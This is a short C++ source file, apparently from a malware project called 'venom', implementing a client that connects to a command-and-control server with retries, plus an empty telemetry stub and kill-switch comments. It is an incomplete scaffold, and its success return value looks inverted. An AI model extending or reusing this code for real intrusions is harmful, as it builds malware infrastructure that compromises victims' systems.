#include "CommunicationHandler.h"

CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
{
	cncInformation.sin_family = AF_INET;
	cncInformation.sin_port = htons(cncPort);
	cncInformation.sin_addr.S_un.S_addr = inet_addr(cncIp.c_str());

	connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (connectionSocket == INVALID_SOCKET)
	{
		// Add a kill switch for venom, should be a generic function for all classes in case of a fatal failure.
		WSACleanup();
	}
}

bool CommunicationHandler::Communicator::connectToCnc()
{
	for (int connectionAttemptCount = 0; connectionAttemptCount < MAXIMUM_CONNECTION_ATTEMPTS; connectionAttemptCount++)
	{
		if (0 == connect(connectionSocket, reinterpret_cast<const sockaddr*>(&cncInformation), sizeof(cncInformation)))
		{
			return STATUS_SUCCESS;
		}
	}

	// Add a kiil.
	WSACleanup();
	return STATUS_FAILURE;
}

void CommunicationHandler::Communicator::SendTelemetry()
{
	// Need to implement.
}